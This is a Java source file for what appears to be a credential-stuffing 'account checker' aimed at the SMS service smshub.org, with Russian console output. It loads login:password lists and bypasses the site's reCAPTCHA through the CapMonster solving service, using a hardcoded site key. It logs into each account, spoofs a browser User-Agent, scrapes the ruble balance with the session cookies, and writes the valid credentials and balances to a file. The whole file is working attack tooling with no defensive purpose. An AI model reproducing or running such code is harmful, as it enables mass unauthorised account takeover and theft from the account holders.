package ru.marthastudios.panic;

import com.google.gson.Gson;
import org.apache.hc.client5.http.classic.methods.HttpGet;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.entity.mime.MultipartEntityBuilder;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClientBuilder;
import org.apache.hc.core5.http.Header;
import org.apache.hc.core5.http.HttpEntity;
import org.apache.hc.core5.http.ParseException;
import org.apache.hc.core5.http.io.entity.EntityUtils;
import org.apache.hc.core5.http.io.entity.StringEntity;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import ru.marthastudios.panic.model.*;

import java.io.*;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {
    private static final Gson gson = new Gson();
    private static final ExecutorService executorService = Executors.newVirtualThreadPerTaskExecutor();
    private static final Set<Integer> registeredThreads = new HashSet<>();
    private static final Map<Integer, String> accountsMap = new HashMap<>();
    private static final String SMS_HUB_URL = "https://smshub.org/ru/home";
    private static final String SMS_HUB_GET_DATA_URL = "https://smshub.org/api.php?cat=scripts&act=authClient&action=auth";
    private static final String CAP_MONSTER_CREATE_TASK_URL = "https://api.capmonster.cloud/createTask";
    private static final String CAP_MONSTER_CHECK_TASK_RESULT_URL = "https://api.capmonster.cloud/getTaskResult";
    private static final String VALID_ACCOUNTS_FILENAME = "valid_accounts.txt";
    private static final String UNCHECKED_ACCOUNTS_FILENAME = "unchecked_accounts.txt";
    private static final String INVALID_ACCOUNTS_FILENAME = "invalid_accounts.txt";
    private static PrintWriter invalidAccountsFile = null;
    private static PrintWriter validAccountsFile = null;
    private static PrintWriter uncheckedAccountsFile = null;
    private static final Integer[] coolDowns = new Integer[] {7000, 8000, 9000, 10000};
    private static String CAP_MONSTER_CLIENT_ID;

    static {
        try (InputStream input = Main.class.getClassLoader().getResourceAsStream("config.properties")){

            Properties properties = new Properties();

            properties.load(input);

            CAP_MONSTER_CLIENT_ID = properties.getProperty("cap-monster.clientId");
        }catch (Exception ignored){
        }
    }

    public static void main(String[] args) {
        System.out.println("Введите полное название текстового файла (например input.txt)");

        Scanner scanner = new Scanner(System.in);
        String inputFileName = scanner.nextLine();

        System.out.println("Добавляю аккаунты во временное хранилище...");

        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader(inputFileName));
            String data;
            int iteration = 0;

            while ((data = bufferedReader.readLine()) != null) {
                accountsMap.put(iteration, data);

                iteration += 1;
            }

            bufferedReader.close();

        } catch (IOException e){
            e.printStackTrace();
        }

        System.out.println("Начинаю проверять аккаунты на валидность и парсить баланс...");

        try {
            invalidAccountsFile = new PrintWriter(INVALID_ACCOUNTS_FILENAME, "UTF-8");
            validAccountsFile = new PrintWriter(VALID_ACCOUNTS_FILENAME, "UTF-8");
            uncheckedAccountsFile = new PrintWriter(UNCHECKED_ACCOUNTS_FILENAME, "UTF-8");

        } catch (FileNotFoundException | UnsupportedEncodingException e){
            e.printStackTrace();
        }

        int accountsCount = accountsMap.size();

        if (accountsCount != 1){
            if (accountsCount <= 28){
                for (int i = 0; i <= accountsCount; i++){
                    executorService.execute(() -> {
                        handleChecking(accountsCount);
                    });
                }
            } else {
                for (int i = 0; i <= 28; i++){
                    executorService.execute(() -> {
                        handleChecking(accountsCount);
                    });
                }
            }
            executorService.shutdown();
        }

        handleChecking(accountsCount);

        try {
            Thread.sleep(5000);
        } catch (Exception e){
        }

        if (accountsCount != 1) {
            while (!executorService.isTerminated()) {

            }
        }

        invalidAccountsFile.close();
        validAccountsFile.close();
        uncheckedAccountsFile.close();

    }

    public static void handleChecking(int accountsCount) {
        int indexAccount = registerThread();
        String account;

        while (true){
            if (accountsMap.get(indexAccount) == null){
                return;
            } else {
                account = accountsMap.get(indexAccount);
            }

            String[] accountData = account.split(":");

            String login = accountData[0];
            String password = accountData[1];

            handleCheckingCaptchaAndParsing(login, password);

            if (accountsCount > 30){
                indexAccount = indexAccount + 30;
            } else {
                return;
            }
        }

    }

    public static void handleCheckingCaptchaAndParsing(String login, String password){
        int requestCoolDown;

        String recaptchaCode = null;

        Long taskId = null;

        CloseableHttpClient httpClient = HttpClientBuilder.create().build();

        Random random = new Random();

        requestCoolDown = coolDowns[random.nextInt((3) + 1)];

        while (taskId == null){
            HttpPost request = new HttpPost(CAP_MONSTER_CREATE_TASK_URL);

            request.setEntity(new StringEntity(
                    gson.toJson(new CapMonsterCreateTaskRequest(
                            CAP_MONSTER_CLIENT_ID,
                            new CapMonsterCreateTaskRequest.Task(
                                    "RecaptchaV2EnterpriseTaskProxyless",
                                    "https://smshub.org/ru/home",
                                    "6LeWTyMUAAAAACNJ3G4EoVBT3m9DhNSkCGdPhPjH"
                            )))
            ));
            request.setHeader("Content-Type", "application/json");

            CloseableHttpResponse response;

            try {
                response = httpClient.execute(request);

                taskId = gson.fromJson(EntityUtils.toString(response.getEntity(), "UTF-8"), CapMonsterCreateTaskResponse.class)
                        .getTaskId();
            } catch (IOException e){
                requestCoolDown = coolDowns[random.nextInt((3) + 1)];

                continue;
            } catch (ParseException e) {
                throw new RuntimeException(e);
            }

            try {
                Thread.sleep(requestCoolDown);

                requestCoolDown = coolDowns[random.nextInt((3) + 1)];
            }catch (InterruptedException e){
                e.printStackTrace();
            }
        }

        while(recaptchaCode == null){
            HttpPost request = new HttpPost(CAP_MONSTER_CHECK_TASK_RESULT_URL);

            request.setEntity(new StringEntity(
                    gson.toJson(new CapMonsterCheckTaskResultRequest(
                            CAP_MONSTER_CLIENT_ID,
                            taskId
                    ))
            ));
            request.setHeader("Content-Type", "application/json");

            CapMonsterCheckTaskResultResponse capMonsterCheckTaskResultResponse;

            try {
                CloseableHttpResponse response = httpClient.execute(request);

                capMonsterCheckTaskResultResponse =
                        gson.fromJson(EntityUtils.toString(response.getEntity(), "UTF-8"), CapMonsterCheckTaskResultResponse.class);

                if (capMonsterCheckTaskResultResponse.getStatus().equals("processing")){
                    Thread.sleep(requestCoolDown);

                    requestCoolDown = coolDowns[random.nextInt((3) + 1)];
                } else if (capMonsterCheckTaskResultResponse.getSolution() != null){
                    recaptchaCode = capMonsterCheckTaskResultResponse.getSolution().getgRecaptchaResponse();
                } else {
                    System.out.println("[-] Добавлен нечекнутый аккаунт " + login + ":" + password);
                    printWriteSynchronized(uncheckedAccountsFile, login + ":" + password);
                    return;
                }


            } catch (IOException e){
                e.printStackTrace();

                try {
                    Thread.sleep(requestCoolDown);

                    requestCoolDown = coolDowns[random.nextInt((3) + 1)];
                } catch (InterruptedException ed){
                    throw new RuntimeException(ed);
                }

                requestCoolDown = coolDowns[random.nextInt((3) + 1)];
            } catch (ParseException | InterruptedException e) {
                throw new RuntimeException(e);
            }
        }

        checkAccountAndParseBalance(httpClient, login, password, recaptchaCode);

    }

    public static void checkAccountAndParseBalance(CloseableHttpClient httpClient, String login, String password, String recaptchaCode){
        SmsHubGetDataResponse smsHubGetDataResponse = null;

        HttpPost request = new HttpPost(SMS_HUB_GET_DATA_URL);

        request.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36");

        HttpEntity entity = MultipartEntityBuilder.create()
                .addTextBody("action", "auth")
                .addTextBody("email", login)
                .addTextBody("pass", password)
                .addTextBody("secretCoded", "")
                .addTextBody("g-recaptcha-response", recaptchaCode)
                .build();

        request.setEntity(entity);

        CloseableHttpResponse response = null;

        try {
            response = httpClient.execute(request);

            smsHubGetDataResponse = gson.fromJson(EntityUtils.toString(response.getEntity()), SmsHubGetDataResponse.class);
        }catch (IOException e){
            e.printStackTrace();
        } catch (ParseException e) {
            throw new RuntimeException(e);
        }

        if (smsHubGetDataResponse.getMsg().equals("You are successfully logged in")){
            Header[] authHeaders = response.getHeaders("set-cookie");

            StringBuilder cookieHeader = new StringBuilder();

            for(Header header : authHeaders){
                if (header.getName().equals("session") || header.getName().equals("refresh_token")
                        || header.getName().equals("userid")){
                    String[] strings = header.getValue().split(" ");

                    cookieHeader.append(strings[0]).append(" ");
                }
            }

            HttpGet getHtmlDocumentRequest = new HttpGet(SMS_HUB_URL);

            getHtmlDocumentRequest.setHeader("Cookie", cookieHeader.toString());

            String getHtmlDocumentResponseString = null;

            try {
                CloseableHttpResponse response1 = httpClient.execute(getHtmlDocumentRequest);
                getHtmlDocumentResponseString = EntityUtils.toString(response1.getEntity());
            } catch (IOException | ParseException e){
                e.printStackTrace();
            }

            Document htmlDocument = Jsoup.parse(getHtmlDocumentResponseString);

            Element element = htmlDocument.getElementById("balansUser");

            if (element == null){
                printWriteSynchronized(uncheckedAccountsFile, login + ":" + password);
                System.out.println("[-] Добавлен нечекнутый аккаунт " + login + ":" + password);
                return;
            }

            //System.out.println(element.text().split(" ")[0]);

            printWriteSynchronized(validAccountsFile, login + ":" + password + " | " + element.text().split(" ")[0] + " rub");
            System.out.println("[+] Добавлен валидный аккаунт " + login + ":" + password);
        } else if (smsHubGetDataResponse.getMsg().equals("Login or password is incorrect")) {
            printWriteSynchronized(invalidAccountsFile, login + ":" + password);
            System.out.println("[-] Добавлен невалидный аккаунт " + login + ":" + password);
        }
    }
    public synchronized static void printWriteSynchronized(PrintWriter writer, String text){
        writer.println(text);
        writer.flush();
    }

    public synchronized static int registerThread(){
        if (registeredThreads.isEmpty()){
            registeredThreads.add(0);
            return 0;
        } else {
            int biggestRegisteredThreadIndex = 0;

            for (int index  : registeredThreads){
                if (index > biggestRegisteredThreadIndex){
                    biggestRegisteredThreadIndex = index;
                }
            }

            biggestRegisteredThreadIndex += 1;

            registeredThreads.add(biggestRegisteredThreadIndex);

            return biggestRegisteredThreadIndex;
        }
    }
}